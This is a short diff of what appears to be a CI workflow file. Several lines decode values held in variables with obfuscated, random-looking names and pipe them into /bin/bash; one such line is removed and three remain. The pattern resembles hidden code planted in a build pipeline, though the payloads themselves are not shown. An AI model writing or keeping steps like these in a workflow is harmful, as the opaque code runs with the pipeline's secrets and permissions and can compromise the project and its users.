@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$xcfvi3367" | jq -r .k7 | /bin/bash
           printf '%s' "$xb40489" | jq -r .ashu882 | /bin/bash
           printf '%s' "$p2" | jq -r .nosoa01532 | /bin/bash
-          echo $orupz22 | jq -r .rkdpb87366 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
